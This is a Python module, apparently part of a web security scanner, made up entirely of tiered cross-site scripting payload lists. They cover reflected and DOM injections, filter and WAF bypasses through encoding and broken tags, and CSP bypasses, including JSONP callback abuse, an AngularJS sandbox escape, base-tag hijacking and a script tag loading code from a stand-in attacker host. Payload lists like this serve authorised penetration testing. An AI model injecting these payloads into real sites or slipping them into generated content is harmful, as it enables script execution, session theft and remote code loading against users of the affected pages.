"""XSS payloads — reflected, DOM, stored, CSP bypass."""

# ── Tier 1: Classic reflected XSS ─────────────────────────────────────────────
XSS_T1 = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "javascript:alert(1)",
]

# ── Tier 2: WAF bypass / encoding ─────────────────────────────────────────────
XSS_T2 = [
    # Broken tags
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # HTML entity encoding
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Unicode escapes
    "<\u0073cript>alert(1)</\u0073cript>",
    # Event handlers with no space
    "<a\tonmouseover=alert(1)>x</a>",
    "<a\nonmouseover=alert(1)>x</a>",
    # SVG with encoding
    "<svg><script>alert&#40;1&#41;</script></svg>",
    # Backtick
    "`<img src=1 onerror=alert(1)>`",
    # Template literals
    "${alert(1)}",
    "#{alert(1)}",
    # Null byte
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Double-encoding
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
]

# ── DOM XSS probes (check JS source sinks) ────────────────────────────────────
XSS_DOM = [
    # Hash-based
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    # Query param reflected in JS
    "?q=<script>alert(1)</script>",
    "?name=<svg onload=alert(1)>",
    # document.write sinks
    "javascript:document.write('<script>alert(1)<\\/script>')",
]

# ── CSP bypass techniques ─────────────────────────────────────────────────────
XSS_CSP_BYPASS = [
    # JSONP abuse
    "?callback=alert(1)//",
    "?jsonp=alert(1)//",
    # Angular sandbox escape (old AngularJS)
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",   # Also SSTI probe
    # Script gadget
    "<script src=//evil.example/x.js></script>",
    # base-uri injection
    "<base href=//evil.example/>",
    # meta refresh
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
]
